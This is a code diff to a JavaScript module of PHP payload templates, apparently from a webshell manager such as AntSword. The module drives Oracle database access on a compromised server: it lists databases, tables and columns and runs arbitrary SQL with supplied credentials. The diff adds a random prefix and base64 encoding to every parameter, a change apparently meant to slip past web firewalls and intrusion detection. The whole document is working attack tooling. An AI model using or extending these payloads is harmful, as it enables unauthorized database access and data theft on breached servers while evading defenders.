@@ -10,9 +10,9 @@ module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
   // 显示所有数据库
   show_databases: {
     _: `$m=get_magic_quotes_gpc();
-      $sid=$m?stripslashes($_POST["${arg1}"]):$_POST["${arg1}"];
-      $usr=$m?stripslashes($_POST["${arg2}"]):$_POST["${arg2}"];
-      $pwd=$m?stripslashes($_POST["${arg3}"]):$_POST["${arg3}"];
+      $sid=base64_decode(substr($m?stripslashes($_POST["${arg1}"]):$_POST["${arg1}"],#randomPrefix#));
+      $usr=base64_decode(substr($m?stripslashes($_POST["${arg2}"]):$_POST["${arg2}"],#randomPrefix#));
+      $pwd=base64_decode(substr($m?stripslashes($_POST["${arg3}"]):$_POST["${arg3}"],#randomPrefix#));
       $chs="utf8";
       $mod=0;
       $H=@oci_connect($usr,$pwd,$sid,$chs,$mod);
@@ -35,17 +35,17 @@ module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
         }
         @oci_close($H);
       };`.replace(/\n\s+/g, ''),
-    [arg1]: '#{host}',
-    [arg2]: '#{user}',
-    [arg3]: '#{passwd}'
+    [arg1]: '#{newbase64::host}',
+    [arg2]: '#{newbase64::user}',
+    [arg3]: '#{newbase64::passwd}'
   },
   // 显示数据库所有表
   show_tables: {
     _: `$m=get_magic_quotes_gpc();
-      $sid=$m?stripslashes($_POST["${arg1}"]):$_POST["${arg1}"];
-      $usr=$m?stripslashes($_POST["${arg2}"]):$_POST["${arg2}"];
-      $pwd=$m?stripslashes($_POST["${arg3}"]):$_POST["${arg3}"];
-      $dbn=$m?stripslashes($_POST["${arg4}"]):$_POST["${arg4}"];
+      $sid=base64_decode(substr($m?stripslashes($_POST["${arg1}"]):$_POST["${arg1}"],#randomPrefix#));
+      $usr=base64_decode(substr($m?stripslashes($_POST["${arg2}"]):$_POST["${arg2}"],#randomPrefix#));
+      $pwd=base64_decode(substr($m?stripslashes($_POST["${arg3}"]):$_POST["${arg3}"],#randomPrefix#));
+      $dbn=base64_decode(substr($m?stripslashes($_POST["${arg4}"]):$_POST["${arg4}"],#randomPrefix#));
       $chs="utf8";
       $mod=0;
       $sql="SELECT TABLE_NAME FROM (SELECT TABLE_NAME FROM ALL_TABLES WHERE OWNER='{$dbn}' ORDER BY 1)";
@@ -75,19 +75,19 @@ module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
         }
         @oci_close($H);
       };`.replace(/\n\s+/g, ''),
-    [arg1]: '#{host}',
-    [arg2]: '#{user}',
-    [arg3]: '#{passwd}',
-    [arg4]: '#{db}'
+    [arg1]: '#{newbase64::host}',
+    [arg2]: '#{newbase64::user}',
+    [arg3]: '#{newbase64::passwd}',
+    [arg4]: '#{newbase64::db}'
   },
   // 显示表字段
   show_columns: {
     _: `$m=get_magic_quotes_gpc();
-      $sid=$m?stripslashes($_POST["${arg1}"]):$_POST["${arg1}"];
-      $usr=$m?stripslashes($_POST["${arg2}"]):$_POST["${arg2}"];
-      $pwd=$m?stripslashes($_POST["${arg3}"]):$_POST["${arg3}"];
-      $dbn=$m?stripslashes($_POST["${arg4}"]):$_POST["${arg4}"];
-      $tab=$m?stripslashes($_POST["${arg5}"]):$_POST["${arg5}"];
+      $sid=base64_decode(substr($m?stripslashes($_POST["${arg1}"]):$_POST["${arg1}"],#randomPrefix#));
+      $usr=base64_decode(substr($m?stripslashes($_POST["${arg2}"]):$_POST["${arg2}"],#randomPrefix#));
+      $pwd=base64_decode(substr($m?stripslashes($_POST["${arg3}"]):$_POST["${arg3}"],#randomPrefix#));
+      $dbn=base64_decode(substr($m?stripslashes($_POST["${arg4}"]):$_POST["${arg4}"],#randomPrefix#));
+      $tab=base64_decode(substr($m?stripslashes($_POST["${arg5}"]):$_POST["${arg5}"],#randomPrefix#));
       $sql="SELECT COLUMN_NAME,DATA_TYPE,DATA_LENGTH FROM ALL_TAB_COLUMNS WHERE OWNER='{$dbn}' AND TABLE_NAME='{$tab}' ORDER BY COLUMN_ID";
       $chs="utf8";
       $mod=0;
@@ -117,21 +117,21 @@ module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
         }
         @oci_close($H);
       };`.replace(/\n\s+/g, ''),
-    [arg1]: '#{host}',
-    [arg2]: '#{user}',
-    [arg3]: '#{passwd}',
-    [arg4]: '#{db}',
-    [arg5]: '#{table}'
+    [arg1]: '#{newbase64::host}',
+    [arg2]: '#{newbase64::user}',
+    [arg3]: '#{newbase64::passwd}',
+    [arg4]: '#{newbase64::db}',
+    [arg5]: '#{newbase64::table}'
   },
   // 执行SQL语句
   query: {
     _: `$m=get_magic_quotes_gpc();
-      $sid=$m?stripslashes($_POST["${arg1}"]):$_POST["${arg1}"];
-      $usr=$m?stripslashes($_POST["${arg2}"]):$_POST["${arg2}"];
-      $pwd=$m?stripslashes($_POST["${arg3}"]):$_POST["${arg3}"];
-      $dbn=$m?stripslashes($_POST["${arg4}"]):$_POST["${arg4}"];
-      $sql=base64_decode($_POST["${arg5}"]);
-      $chs=$m?stripslashes($_POST["${arg6}"]):$_POST["${arg6}"];;
+      $sid=base64_decode(substr($m?stripslashes($_POST["${arg1}"]):$_POST["${arg1}"],#randomPrefix#));
+      $usr=base64_decode(substr($m?stripslashes($_POST["${arg2}"]):$_POST["${arg2}"],#randomPrefix#));
+      $pwd=base64_decode(substr($m?stripslashes($_POST["${arg3}"]):$_POST["${arg3}"],#randomPrefix#));
+      $dbn=base64_decode(substr($m?stripslashes($_POST["${arg4}"]):$_POST["${arg4}"],#randomPrefix#));
+      $sql=base64_decode(substr($m?stripslashes($_POST["${arg5}"]):$_POST["${arg5}"],#randomPrefix#));
+      $chs=base64_decode(substr($m?stripslashes($_POST["${arg6}"]):$_POST["${arg6}"],#randomPrefix#));
       $chs=$chs?$chs:"utf8";
       $mod=0;
       $H=@oci_connect($usr,$pwd,$sid,$chs,$mod);
@@ -167,11 +167,11 @@ module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
         }
         @oci_close($H);
       }`.replace(/\n\s+/g, ''),
-    [arg1]: '#{host}',
-    [arg2]: '#{user}',
-    [arg3]: '#{passwd}',
-    [arg4]: '#{db}',
-    [arg5]: '#{base64::sql}',
-    [arg6]: '#{encode}'
+    [arg1]: '#{newbase64::host}',
+    [arg2]: '#{newbase64::user}',
+    [arg3]: '#{newbase64::passwd}',
+    [arg4]: '#{newbase64::db}',
+    [arg5]: '#{newbase64::sql}',
+    [arg6]: '#{newbase64::encode}'
   }
 })
